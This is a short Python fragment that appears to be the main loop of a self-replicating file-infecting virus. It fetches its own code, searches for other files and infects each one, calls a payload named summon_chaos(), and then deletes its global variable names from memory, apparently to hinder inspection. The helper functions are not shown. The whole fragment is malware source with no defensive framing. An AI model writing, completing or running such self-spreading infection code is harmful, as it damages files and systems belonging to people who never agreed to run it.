 1try:
 2    # retrieve the virus code from the current infected script
 3    virus_code = get_virus_code() 
 4
 5    # look for other files to infect
 6    for file in find_files_to_infect():
 7        infect(file, virus_code)
 8
 9    # call the payload
10    summon_chaos()
11
12# except:
13#     pass
14
15finally:
16    # delete used names from memory
17    for i in list(globals().keys()):
18        if(i[0] != '_'):
19            exec('del {}'.format(i))
20
21    del i
